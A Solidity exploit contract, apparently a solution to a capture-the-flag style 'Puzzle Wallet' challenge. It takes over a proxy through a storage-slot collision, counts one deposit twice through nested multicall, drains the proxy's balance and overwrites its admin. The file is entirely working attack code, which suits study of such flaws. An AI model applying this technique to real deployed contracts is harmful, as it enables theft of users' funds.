// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IPuzzleProxy {
    // proxy
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    // implementation
    function owner() external view returns (address);
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract PuzzleWallet {
    IPuzzleProxy proxy;

    constructor(address _instanceAddress) {
        proxy = IPuzzleProxy(_instanceAddress);
    }

    function attack() public payable {
        require(msg.value == 0.001 ether, "Send 0.001 ETH");

        // set owner of puzzle proxy
        proxy.proposeNewAdmin(address(this));

        // add contract to whitelist
        proxy.addToWhitelist(address(this));

        // deposit in the proxy via multicall and make attacker balance equal to proxy balance
        bytes[] memory data2 = new bytes[](1);
        data2[0] = abi.encodeWithSelector(IPuzzleProxy.deposit.selector);

        bytes[] memory data1 = new bytes[](2);
        data1[0] = abi.encodeWithSelector(IPuzzleProxy.deposit.selector);
        data1[1] = abi.encodeWithSelector(IPuzzleProxy.multicall.selector, data2);

        proxy.multicall{value: msg.value}(data1);

        // withdraw from the proxy
        proxy.execute(msg.sender, address(proxy).balance, "");

        // set admin of puzzle proxy
        proxy.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
